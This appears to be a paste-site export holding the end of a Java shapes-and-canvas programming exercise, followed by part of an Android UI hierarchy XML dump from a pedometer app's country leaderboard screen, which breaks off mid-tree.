    public InvalidIDException(String id) {
        super(String.format(""ID %s is not valid"",id));
    }
}
enum ShapeType {
    CIRCLE,
    RECTANGLE,
    SQUARE
}


class Square extends Shape{


    public Square(String username, double x) {
        super(username, x);
    }

    @Override
    public double getPerimeter() {
        return 4*x;
    }

    @Override
    public double getArea() {
        return x*x;
    }

    @Override
    public ShapeType getShapeType() {
        return ShapeType.SQUARE;
    }

    @Override
    public String toString() {
        return String.format(""Square: -> Side: %.2f Area: %.2f Perimeter: %.2f"",super.getX(),getArea(),getPerimeter());
    }
}

class InvalidDimensionException extends Exception {
    public InvalidDimensionException(double x) {
        super(String.format(""Dimension 0 is not allowed!""));
    }
}

class Rectange extends Shape{

    double y;

    public Rectange(String username, double x, double y) {
        super(username, x);
        this.y = y;
    }

    public double getY() {
        return y;
    }

    public void scaleY(double v) {
        this.y *=v;
    }

    @Override
    public ShapeType getShapeType() {
        return ShapeType.RECTANGLE;
    }

    @Override
    public double getPerimeter() {
        return 2*(x+y);
    }

    @Override
    public double getArea() {
        return x*y;
    }

    @Override
    public String toString() {
        return String.format(""Rectangle: -> Sides: %.2f, %.2f Area: %.2f Perimeter: %.2f"",super.getX(),getY(),getArea(),getPerimeter());
    }
}
class Circle extends Shape{


    public Circle(String username, double x) {
        super(username, x);
    }

    @Override
    public double getPerimeter() {
        return 2*x*Math.PI;
    }

    @Override
    public double getArea() {
        return x*x*Math.PI;
    }

    @Override
    public ShapeType getShapeType() {
        return ShapeType.CIRCLE;
    }
    @Override
    public String toString() {
        return String.format(""Circle -> Radius: %.2f Area: %.2f Perimeter: %.2f"",super.getX(),getArea(),getPerimeter());
    }
}
abstract class Shape {
    double x;
    String username;
    public abstract double getPerimeter();

    public abstract double getArea();

    public abstract ShapeType getShapeType();

    public Shape(String username, double x) {
        this.username= username;
        this.x = x;
    }

    public double getX() {
        return x;
    }

    public String getUsername() {
        return username;
    }

    public static Shape create(String line) throws InvalidIDException, InvalidDimensionException {
        String[] parts = line.split(""\\s+"");
        int shapeNumber = Integer.parseInt(parts[0]);
        String username = parts[1];
        double x = Double.parseDouble(parts[2]);
        if(x==0)
            throw new InvalidDimensionException(x);
        double y= 0.0;
        if(username.length()!=6)
            throw new InvalidIDException(username);
        for(int i=0;i<username.length();i++)
            if(!Character.isAlphabetic(username.charAt(i))&&!Character.isDigit(username.charAt(i))){
                throw new InvalidIDException(username);
            }
        if(parts.length==4){
            y = Double.parseDouble(parts[3]);
            if(y==0)
                throw new InvalidDimensionException(y);
        }
        if(shapeNumber==1)
            return new Circle(username,x);
        else if(shapeNumber==2)
            return new Square(username,x);
        else
            return new Rectange(username,x,y);
    }

    public void scaleX(double v) {
        this.x*=v;
    }
}
class Canvas {

    List<Shape> shapes;


    public void readShapes(InputStream in) {
        BufferedReader br = new BufferedReader(new InputStreamReader(in));
        shapes = new ArrayList<>();

        try {
            String line;
            while ((line = br.readLine()) != null) {
                try {
                    Shape shape = Shape.create(line);
                    if(shapes.isEmpty())
                        shapes.add(shape);
                    else{
                        for(int i=0;i<shapes.size();i++){
                            if(shapes.get(i).getArea()>shape.getArea()){
                                shapes.add(i,shape);
                                break;
                            }
                        }
                        if(!shapes.contains(shape))
                            shapes.add(shape);
                    }

                } catch (InvalidIDException e) {
                    System.out.println(e.getMessage());
                    // Continue reading next line
                } catch (InvalidDimensionException e) {
                    System.out.println(e.getMessage());
                    // STOP reading shapes but do not crash the program
                    break;
                }
            }
        } catch (IOException e) {
            e.printStackTrace(); // Handle IO error if needed
        }
    }

    public void printAllShapes(PrintStream out) {

        PrintWriter printWriter = new PrintWriter(out);
        shapes.stream().forEach(printWriter::println);
        printWriter.flush();
    }

    public void scaleShapes(String username, double v) {
        shapes.stream().filter(i->i.getUsername().equals(username)).forEach(i->{
            i.scaleX(v);
        });
        shapes.stream().filter(i->i.getUsername().equals(username) && i.getShapeType().equals(ShapeType.RECTANGLE))
                .map(i->(Rectange)i)
                .forEach(i->{
            i.scaleY(v);
        });

    }

        public void printByUserId(PrintStream out) {
        PrintWriter printWriter = new PrintWriter(out);
        Map<String,List<Shape>> shapesByUser = new HashMap<>();
        for(Shape shape: shapes) {
            shapesByUser.putIfAbsent(shape.getUsername(), new ArrayList<>());
            shapesByUser.get(shape.getUsername()).add(shape);
        }

        shapesByUser.entrySet().stream()
                .sorted(Comparator
                        .comparing((Map.Entry<String, List<Shape>> entry) -> entry.getValue().size(), Comparator.reverseOrder())
                        .thenComparing(entry -> entry.getValue().stream()
                                .mapToDouble(Shape::getArea)
                                .sum(), Comparator.naturalOrder())
                ).forEach(entry -> {
                    printWriter.println(String.format(""Shapes of user: %s"", entry.getKey()));
                    entry.getValue().stream().sorted(Comparator.comparing(Shape::getPerimeter))
                            .forEach(shape -> printWriter.println(shape));
                });
        printWriter.flush();
    }

    public void statistics(PrintStream out) {
        PrintWriter printWriter = new PrintWriter(out);
        DoubleSummaryStatistics doubleSummaryStatistics = shapes.stream().mapToDouble(Shape::getArea).summaryStatistics();
        printWriter.println(String.format(""count: %d\nsum: %.2f\nmin: %.2f\naverage: %.2f\nmax: %.2f\n"",doubleSummaryStatistics.getCount()
                ,doubleSummaryStatistics.getSum()
                ,doubleSummaryStatistics.getMin()
                ,doubleSummaryStatistics.getAverage()
                ,doubleSummaryStatistics.getMax()));
        printWriter.flush();
    }
}
public class CanvasTest {

    public static void main(String[] args) {
        Canvas canvas = new Canvas();

        System.out.println(""READ SHAPES AND EXCEPTIONS TESTING"");
        canvas.readShapes(System.in);
      
        System.out.println(""BEFORE SCALING"");
        canvas.printAllShapes(System.out);
        canvas.scaleShapes(""123456"", 1.5);
        System.out.println(""AFTER SCALING"");
        canvas.printAllShapes(System.out);

        System.out.println(""PRINT BY USER ID TESTING"");
        canvas.printByUserId(System.out);

        System.out.println(""PRINT STATISTICS"");
        canvas.statistics(System.out);
    }
}"
SdqsxgN4,Dumps,LVL23HT,CSS,Sunday 27th of April 2025 10:46:20 AM CDT,Jones Granatyr
rZrEZgyk,walker,VytautasLDK,XML,Sunday 27th of April 2025 10:05:47 AM CDT,"This XML file does not appear to have any style information associated with it. The document tree is shown below.
<hierarchy rotation=""0"">
<node index=""0"" text="""" resource-id="""" class=""android.widget.FrameLayout"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][1080,2020]"">
<node index=""0"" text="""" resource-id="""" class=""android.widget.LinearLayout"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][1080,2020]"">
<node index=""0"" text="""" resource-id="""" class=""android.widget.FrameLayout"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][1080,2020]"">
<node index=""0"" text="""" resource-id=""de.walk15.pedometer:id/action_bar_root"" class=""android.widget.LinearLayout"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][1080,2020]"">
<node index=""0"" text="""" resource-id=""android:id/content"" class=""android.widget.FrameLayout"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][1080,2020]"">
<node index=""0"" text="""" resource-id="""" class=""android.widget.FrameLayout"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][1080,2020]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][1080,2020]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][1080,2020]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][1080,2020]""/>
<node index=""1"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][1080,2020]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][1080,2020]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][1080,2020]"">
<node index=""1"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][1080,2020]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][1080,2020]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][1080,2020]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][1080,1989]"">
<node index=""0"" text="""" resource-id="""" class=""android.widget.FrameLayout"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][1080,1989]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][1080,1989]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][1080,1989]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][1080,1989]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][1080,1989]"">
<node index=""0"" text="""" resource-id="""" class=""android.widget.LinearLayout"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][1080,285]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][1080,285]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[48,165][120,237]"">
<node NAF=""true"" index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""true"" enabled=""true"" focusable=""true"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[48,165][120,237]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[48,165][120,237]"">
<node index=""0"" text="""" resource-id="""" class=""android.widget.ImageView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[48,165][120,237]""/>
</node>
</node>
</node>
<node index=""2"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[960,165][1032,237]"">
<node NAF=""true"" index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""true"" enabled=""true"" focusable=""true"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[960,165][1032,237]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[960,165][1032,237]"">
<node index=""0"" text="""" resource-id="""" class=""android.widget.ImageView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[960,165][1032,237]""/>
</node>
</node>
</node>
</node>
</node>
<node index=""1"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,285][1080,1989]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,285][1080,1989]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,285][1080,1989]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,285][1080,1989]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,285][1080,1989]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,285][1080,1989]"">
<node index=""0"" text="""" resource-id="""" class=""android.widget.ScrollView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""true"" focused=""false"" scrollable=""true"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,285][1080,1989]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,285][1080,1989]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,285][1080,1369]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[294,285][786,777]"">
<node index=""0"" text="""" resource-id="""" class=""android.widget.ImageView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[294,285][786,777]""/>
</node>
<node index=""1"" text=""North Macedonia"" resource-id="""" class=""android.widget.TextView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[190,777][891,963]""/>
<node index=""2"" text="""" resource-id="""" class=""android.widget.ImageView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[500,968][542,1010]""/>
<node index=""3"" text=""9"" resource-id="""" class=""android.widget.TextView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[554,963][580,1015]""/>
<node index=""4"" text=""2 262 930"" resource-id="""" class=""android.widget.TextView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[48,1063][281,1123]""/>
<node index=""5"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[293,1075][329,1111]"">
<node index=""0"" text="""" resource-id="""" class=""android.widget.ImageView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[293,1075][329,1111]""/>
</node>
<node index=""6"" text=""4 000 000 000"" resource-id="""" class=""android.widget.TextView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[661,1067][984,1119]""/>
<node index=""7"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[996,1075][1032,1111]"">
<node index=""0"" text="""" resource-id="""" class=""android.widget.ImageView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[996,1075][1032,1111]""/>
</node>
<node index=""8"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[48,1135][1032,1153]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[48,1135][66,1153]""/>
</node>
<node index=""9"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc=""8 082"" checkable=""false"" checked=""false"" clickable=""true"" enabled=""true"" focusable=""true"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[48,1201][294,1321]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[48,1201][182,1321]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[48,1201][96,1249]"">
<node index=""0"" text="""" resource-id="""" class=""android.widget.ImageView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[48,1201][96,1249]""/>
</node>
<node index=""1"" text=""8 082"" resource-id="""" class=""android.widget.TextView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[48,1261][182,1321]""/>
</node>
</node>
<node index=""10"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc=""291"" checkable=""false"" checked=""false"" clickable=""true"" enabled=""true"" focusable=""true"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[294,1201][540,1321]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[294,1201][368,1321]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[294,1201][342,1249]"">
<node index=""0"" text="""" resource-id="""" class=""android.widget.ImageView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[294,1201][342,1249]""/>
</node>
<node index=""1"" text=""291"" resource-id="""" class=""android.widget.TextView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[294,1261][368,1321]""/>
</node>
</node>
<node index=""11"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc=""0.93"" checkable=""false"" checked=""false"" clickable=""true"" enabled=""true"" focusable=""true"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[540,1201][786,1321]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[540,1201][639,1321]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[540,1201][588,1249]"">
<node index=""0"" text="""" resource-id="""" class=""android.widget.ImageView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[540,1201][588,1249]""/>
</node>
<node index=""1"" text=""0.93"" resource-id="""" class=""android.widget.TextView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[540,1261][639,1321]""/>
</node>
</node>
<node index=""12"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc=""0.05"" checkable=""false"" checked=""false"" clickable=""true"" enabled=""true"" focusable=""true"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[786,1201][1032,1321]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[786,1201][890,1321]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[786,1201][834,1249]"">
<node index=""0"" text="""" resource-id="""" class=""android.widget.ImageView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[786,1201][834,1249]""/>
</node>
<node index=""1"" text=""0.05"" resource-id="""" class=""android.widget.TextView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[786,1261][890,1321]""/>
</node>
</node>
</node>
<node index=""1"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,1393][1080,1989]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,1393][1080,1609]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc=""1, Jelena Somkina, 770 210"" checkable=""false"" checked=""false"" clickable=""true"" enabled=""true"" focusable=""true"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,1393][1080,1609]"">
